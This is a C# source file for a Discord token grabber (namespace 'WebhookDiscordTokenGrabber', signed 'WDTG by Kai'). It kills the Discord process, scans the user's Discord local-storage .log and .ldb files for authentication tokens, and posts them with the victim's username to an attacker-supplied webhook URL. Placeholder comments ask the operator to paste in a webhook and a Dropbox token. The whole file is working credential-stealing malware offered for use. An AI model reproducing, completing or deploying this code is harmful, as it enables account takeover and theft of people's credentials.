using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Net.Http;

namespace WebhookDiscordTokenGrabber
{
    public class Grabbing
    {
        public static void KillDiscord()
        {
            try
            {
                Process[] processes = Process.GetProcessesByName("Discord");
                foreach (var process in processes)
                {

                    process.Kill();
                }
            }
            catch
            {
                return;
            }

        }

        public static string DropboxToken = "abcdefghijklmnopqrstuvwxyz"; // PASTE YOUR DROPBOX DEVELOPER APP TOKEN HERE. (GIVE THE APP FULL ACCESS TO YOUR DROPBOX!)

        public static void UploadLogFile()
        {
            var files = SearchForFile(); // to get log files
            if (files.Count == 0)
            {
                Console.WriteLine("Didn't find any log files");
                return;
            }
            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*"))
                {
                    if (match.Length == 59)
                    {
                        Console.WriteLine($"Token={match.ToString()}");
                        using (StreamWriter sw = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenlogtoken.txt", true))
                        {
                            sw.WriteLine($"Token={match.ToString()}");
                        }
                    }
                }
            }

            string uploadfile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenlogtoken.txt";



            List<string> SearchForFile()
            {
                List<string> ldbFiles = new List<string>();
                string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

                if (!Directory.Exists(discordPath))
                {
                    Console.WriteLine("Discord path not found");
                    return ldbFiles;
                }

                foreach (string file in Directory.GetFiles(discordPath, "*.log", SearchOption.TopDirectoryOnly))
                {
                    string rawText = File.ReadAllText(file);
                    if (rawText.Contains("oken"))
                    {
                        Console.WriteLine($"{Path.GetFileName(file)} added");
                        ldbFiles.Add(rawText);
                    }
                }
                return ldbFiles;
            }
        }



        public static void UploadldbFile()
        {
            var files = SearchForFile(); // to get ldb files
            if (files.Count == 0)
            {
                Console.WriteLine("Didn't find any ldb files");
                return;
            }
            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*"))
                {
                    if (match.Length == 59)
                    {
                        Console.WriteLine($"Token={match.ToString()}");
                        using (StreamWriter sw = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenldbtoken.txt", true))
                        {
                            sw.WriteLine($"Token={match.ToString()}");
                        }
                    }
                }
            }

            string uploadfile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenldbtoken.txt";



            List<string> SearchForFile()
            {
                List<string> ldbFiles = new List<string>();
                string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

                if (!Directory.Exists(discordPath))
                {
                    Console.WriteLine("Discord path not found");
                    return ldbFiles;
                }

                foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
                {
                    string rawText = File.ReadAllText(file);
                    if (rawText.Contains("oken"))
                    {
                        Console.WriteLine($"{Path.GetFileName(file)} added");
                        ldbFiles.Add(rawText);
                    }
                }
                return ldbFiles;
            }

        }

        private static readonly string _hookUrl = "abcdefghijklmnopqrstuvwxyz"; // PASTE YOUR WEBHOOK URL HERE


        public static void ReportTokens(/*List<string> tokenReport*/)
        {
            try
            {
                string writtenldbtoken = System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenldbtoken.txt");

                //.ldb upload
                try
                {
                    HttpClient client = new HttpClient();
                    Dictionary<string, string> contents = new Dictionary<string, string>
                    {
                        { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", writtenldbtoken)}" },
                        { "username", "WDTG by Kai" },
                        { "avatar_url", "https://cdn.discordapp.com/attachments/737989668242456688/737989908324417607/wdtg_avatar.PNG" }
                    };

                    client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
                }
                catch { }
            }
            catch
            {
                Console.WriteLine("writtenldbtoken.txt is not found");
            }


            try
            {
                string writtenlogtoken = System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\writtenlogtoken.txt");
                //.log upload
                try
                {
                    HttpClient client = new HttpClient();
                    Dictionary<string, string> contents = new Dictionary<string, string>
                    {
                        { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", writtenlogtoken)}" },
                        { "username", "WDTG by Kai" },
                        { "avatar_url", "https://cdn.discordapp.com/attachments/737989668242456688/737989908324417607/wdtg_avatar.PNG" }
                    };

                    client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
                }
                catch { }
            }
            catch
            {
                Console.WriteLine("writtenlogtoken.txt is not found");
            }
        }
    }
}

